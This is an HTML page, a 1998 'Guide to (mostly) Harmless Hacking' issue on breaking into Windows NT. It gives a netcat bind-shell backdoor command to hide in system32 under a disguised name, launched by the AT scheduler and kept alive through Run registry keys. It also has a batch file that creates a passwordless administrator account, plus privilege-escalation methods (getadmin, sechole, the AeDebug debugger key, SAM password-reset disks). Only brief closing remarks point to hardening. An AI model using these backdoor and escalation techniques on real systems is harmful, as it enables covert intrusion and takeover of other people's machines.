@@ -1,0 +1,254 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <title>How to Break into Windows NT</title>
+</head>
+<body>
+<br>
+__________________________________________________________
+<br>GUIDE TO (mostly) HARMLESS HACKING
+<p>Vol. 3 No. 10&nbsp; Part 2
+<p>How to Break into Windows NT: Backdoors and Practical Jokes
+<br>____________________________________________________________
+<p>by keydet89@yahoo.com
+<br>&nbsp;
+<p>[Backdoors and Practical Jokes]
+<p>Creating backdoors is how you can insure your ability to return to the
+<br>system at will.&nbsp; This is almost a black art when dealing with
+Un*x
+<br>systems, and it can also be done on NT.
+<p>netcat, from Weld Pond, takes advantage of any user's ability to use
+<br>a local port.&nbsp; netcat is a command-line utility that has several
+<br>switches used to configure it's operation.&nbsp; This makes netcat,
+combined
+<br>with a properly configured command-line launched from a batch file,
+<br>an excellent choice for a backdoor.
+<br>(get netcat for NT from http://www.l0pht.com/weld)
+<p>The batch file needs to contain:
+<p>nc -L -d -p [port] -t -e cmd.exe
+<p>&nbsp;L&nbsp; tells netcat to open keep listening after the current
+<br>&nbsp; session terminates
+<br>&nbsp;d detach - don't open a DOS window when running (IMPORTANT)
+<br>&nbsp;p which port to bind to
+<br>&nbsp;t enable telnet negotiations
+<br>&nbsp;e command to execute upon connection
+<p>Copy this command line into a batch file named "runnc.bat" or
+<br>something similar.&nbsp; Then copy both the netcat executeable file
+and
+<br>the batch file to a directory that is in the PATH on the target
+<br>machine...c:\winnt\system32\ is a good place to hide them.&nbsp; Another
+<br>little trick to keep in mind is to rename the netcat executable from
+<br>'nc.exe' to something innocuous, like 'winlog.exe' (and make sure to
+<br>make the appropriate changes to the batch file).&nbsp; That way, when
+you
+<br>or your buddy opens the TaskList, there won't seem to be any 'unusual'
+<br>programs running.&nbsp; Run the batch file on your own machine, and
+open
+<br>the TaskList (right-click on the TaskBar, and choose TaskList)...
+<p>Once this batch file is run, all you need to do is connect via telnet,
+<br>or netcat in client mode:
+<p>c:\>nc -v [ipaddress of target] [port]
+<p>So how do you run this batch file?&nbsp; By default, NT doesn't have
+an
+<br>interactive telnet server installed so that you can just log in, so
+<br>what do you do?&nbsp; Well, there is a great little service called
+the
+<br>Schedule (or 'AT') service, which lets you schedule programs to be
+<br>run at a later date.&nbsp; To see if your Schedule service is running,
+<br>you can either click Control Panel -> Services, and check it, or
+<br>if you have Perl installed (see above), you can run the following
+<br>script to see if the service is running, and if not, start it:
+<p>-----&nbsp; begin script&nbsp; -----
+<br># atchk.plx
+<br># Script checks to see if AT service is running on local
+<br># machine...if not, starts it.&nbsp; Minor modifications will
+<br># allow you to do the same thing on a remote machine, once
+<br># have successfully completed the IPC$ connection and have
+<br># Administrator rights.
+<br>#
+<br># usage: perl atchck.plx
+<p>use Win32::Service;
+<br>use Win32;
+<br>my %status;
+<p>Win32::Service::GetStatus('','Schedule', \%status);
+<br>die "service is arealdy started\n" if ($status{CurrentState} == 4);
+<p>Win32::Service::StartService(Win32::NodeName( ),'Schedule') || die
+<br>"Can't start service\n";
+<p>print "Service started\n";
+<br>#**Note:&nbsp; This script was modified from:
+<br>#http://www.inforoute.cgs.fr/leberre1/perlser.htm
+<br>-----&nbsp; end script&nbsp; -----
+<p>Note:&nbsp; Only Administrators or members of the Administrators group
+can
+<br>run the AT command.
+<p>Once installed, the 'runnc.bat' file can be executed via the AT command.
+<p>The necessary syntax for the AT command is:
+<p>AT [\\computername] [time] "command"
+<p>or more particularly:
+<p>AT [\\computername] [time] runnc.bat
+<p>References to commands can be hidden in various places within the
+<br>registry, set to run when a user logs in:
+<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+<p>Note:&nbsp; This last key is where you will find things like AOL's
+<br>Instant Messenger.&nbsp; The install puts the reference to the app
+there,
+<br>but you won't find it in your StartUp box...
+<p>Here's another little exercise that you should run on your own machine
+<br>first, and then try copying it over to a friend's machine and running
+<br>it via the AT command.&nbsp; The batch file below uses commands that
+are
+<br>native to NT to create a new user account, then make that user a member
+<br>of the Administrator group:
+<p>-----&nbsp; begin batch file&nbsp; -----
+<br>@echo off
+<br>net user Admin /add /expires:never /passwordreq:no
+<br>net localgroup "Administrators" /add Admin
+<br>net localgroup "Users" /del Admin
+<br>-----&nbsp; end batch file&nbsp; -----
+<p>What are some other neat little tricks to try?&nbsp; Get Netbus from
+<br>http://netbus.hypermart.net/ .&nbsp; This little program is similar
+to
+<br>Back Orifice, and it runs on NT.&nbsp; (Visit the makers of Back Orifice
+<br>at http://www.cultdeadcow.com/)
+<p>Okay, so you and your 'leet buddies have played around with each
+<br>other's machines via the Internet, and pretty much walked through the
+<br>exercises listed above.&nbsp; Now, what are some local 'attacks' that
+you
+<br>can run against your own machine?
+<p>[Local Attacks]
+<p>Let's say you have a couple of accounts on your NT box, at least one
+<br>with Admin rights, and one or two others with user rights.&nbsp; You've
+<br>already run through the password cracking exercise and seen how easy
+<br>it is to get the 'SAM._' file and crack it.&nbsp; So what else can
+you do?
+<p>Well, you try the 'getadmin' exploit.&nbsp; This exploit consists of
+a
+<br>program and .dll file that will add the user to the Administrator group.
+<p>Get the necessary files from:
+<p>http://www.nmrc.org/files/nt/index.html
+<p>The Microsoft site has a hotfix for the "getadmin" exploit, located
+<br>at:
+<p>ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/
+<br>nt40/hotfixes-postSP3/getadmin-fix/
+<p>General information on security problems addressed by Microsoft
+<br>can be found at:
+<p>http://www.microsoft.com/security/issues.htm
+<p>For more information on the 'getadmin' exploit, go to:
+<p>http://www.ntsecurity.net
+<p>and search for 'getadmin'.
+<p>All you need to do to test this exploit is log onto your system via
+<br>a user account, copy the files into a directory, and run getadmin.exe.
+<p>Another local exploit similar to the "getadmin" exploit has popped up.
+<br>The exploit works like this:&nbsp; the user runs a program called
+<br>"sechole.exe" and the final result (possibly after a reboot) is that
+<br>the user now has administrator rights!&nbsp; For more information on
+this
+<br>and the zipped archive "sechole.zip", go to:
+<br>http://www.technotronic.com/microsoft.html
+<p>A variation on this exploit involves the Registry setting the
+<br>determines what the default debugger (the program run when a user mode
+<br>program crashes) is run.
+<br>Usually, the setting is:
+<br>Hive: HKEY_LOCAL_MACHINE
+<br>Key:&nbsp; \Software\Microsoft\Windows NT\CurrentVersion\AeDebug
+<br>Value: Debugger
+<br>Data Type: REG_SZ
+<br>Default Value: drwtsn32 -p %ld -e %ld -g
+<p>The "Everyone" group has the ability to set the value of this key, and
+<br>is essential how you can exploit it.&nbsp; The debugger runs in the
+security
+<br>context of the crashed application, so all you need to do is change
+the
+<br>Default Value (via 'regedit') to point to the User Manager, and then
+<br>crash one of the services that are running.&nbsp; Then you can add
+accounts
+<br>to the User Manager...even to the Administrator group.
+<p>*******************************************************************
+<br>NEWBIE NOTE:&nbsp; Before any changes are made to the Registry, make
+<br>sure that you make a backup of your current Registry using the
+<br>"rdisk /s" utility.&nbsp; You can make changes to the Registry by clicking
+<br>Start -> Run, and entering either 'regedit' or 'regedt32'.&nbsp; Before
+<br>you attempt any of this, read the files pertaining to the Registry
+<br>from the Rhino9 site (http://207.89.195.250/texts/), the "Hacker's
+<br>Modern Desk Reference" (http://www.antionline.com/SpecialReports/MHD/)
+<br>and even "Hardening NT" (http://pw2.netcom.com/~honeyluv/index.html).
+<br>*******************************************************************
+<p>Another local exploit that you can attempt uses the NTFSDOS utility,
+<br>which is nothing more than a bootable DOS diskette that can read (but
+<br>not write to) NTFS partitions.&nbsp; This would potentially allow an
+attacker
+<p>to make off with copies of systems files, to include the SAM database.
+<br>The folks at Systems Internals (http://www.sysinternals.com) have not
+<br>only an NTFSDOS utility available, but also some tools that give the
+<br>user limited write capability.&nbsp; SysInternals also has NTRecover
+and
+<br>NTLocksmith, along with a variety of other useful tools.
+<p>Get a copy of the utility, and try booting your own system with the
+<br>diskette in the A:\ drive.
+<p>There is a nifty little utility available, one that is essentially a
+<br>Linux boot disk:
+<p>http://home.eunet.no/~pnordahl/ntpasswd/bootdisk.html
+<p>The utility comes with rawrite.exe, so that DOS and Windows users can
+<br>download the utility and create the Linux boot disk.
+<p>The utility is a NTFS-bootable minimal kernel, with a small program
+<br>that allows the user to change any password in the SAM database.
+<br>Alternatively, you can find the Linux binary file (without the
+<br>rawrite.exe utility) at:
+<p>http://www.nmrc.org/files/snt/index.html
+<p>called bootdisk.bin, and according to the description, this is the
+<br>file you are interested in.&nbsp; You will still need to get a copy
+of
+<br>rawrite.exe, in order to write the information to a diskette in a
+<br>useable form.
+<p>Carefully read the instructions on the web page for the utility
+<br>(listed above) and if you are feeling especially '31337', try it out
+<br>against your own system.
+<p>[Final Words]
+<p>By now you should be familiar with some of the methods used to attack
+<br>and compromise an NT system.&nbsp; Hopefully, you have seen fit to
+try out
+<br>the exercises on your own system, or against a friend's system (with
+<br>permission, of course).&nbsp; And it should start becoming clear what
+it
+<br>takes to secure a system from attack.&nbsp; The first step is to become
+<br>familiar with various exploits by regularly visiting such sites as
+<br>RootShell (http://www.rootshell.com), the ISS X-Force site
+<br>(http://www.iss.net/xforce), NTSecurity (http://www.ntsecurity.net),
+<br>and NTBugTraq (http://www.ntbugtraq.com).&nbsp; Then go to the Microsoft
+<br>Support (http://support.microsoft.com) and Security
+<br>(http://www.microsoft.com/security) sites to see what the 'official'
+<br>fixes are...the NTBugTraq site does a great job of keeping track of
+<br>the latest hotfixes, and which ones are obsolete.&nbsp; The Microsoft
+Support
+<br>site is especially useful, because you can search for information or
+<br>specific KnowledgeBase articles, and print out those that you find
+<br>useful.&nbsp; The "Hardening NT" document from Santeria Systems
+<br>(http://pw2.netcom.com/~honeyluv/index.html) provides an excellent
+<br>guide for protecting your system, complete with references to the
+<br>appropriate KnowledgeBase article for each step.&nbsp; Finally, Microsoft
+<br>maintains a list of security bulletins at:
+<br>http://www.microsoft.com/security
+<br>&nbsp;
+<p>_______________________________________________________________________
+<br>Where are those back issues of GTMHHs and Happy Hacker Digests? Check
+out
+<br>the official Happy Hacker Web page at http://www.happyhacker.org.
+<br>We are against computer crime. We support good, old-fashioned hacking
+of the
+<br>kind that led to the creation of the Internet and a new era of freedom
+of
+<br>information. But we hate computer crime.&nbsp; So don't email us about
+any crimes
+<br>you have committed!
+<br>To subscribe to Happy Hacker and receive the Guides to (mostly) Harmless
+<br>Hacking, please email hacker@techbroker.com with message "subscribe
+<br>happy-hacker" in the body of your message.
+<br>Copyright 1998 keydet89.&nbsp; You may forward, print out or post this
+<br>GUIDE TO (mostly) HARMLESS HACKING on your Web site as long as you
+leave
+<br>this notice at the end.
+<br>_________________________________________________________
+</body>
+</html>
